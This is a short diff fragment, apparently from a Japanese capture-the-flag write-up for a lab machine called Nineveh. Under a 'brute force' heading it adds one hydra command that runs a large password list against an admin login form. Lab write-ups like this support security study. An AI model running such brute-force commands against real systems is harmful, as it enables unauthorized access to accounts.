@@ -219,6 +219,9 @@ mysql> select * from users;
 1 row in set (0.00 sec)
 ```
 ### ブルートフォース
+```
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
+```
 
 ```
 ┌──(kali㉿kali)-[~/Documents/Nineveh]
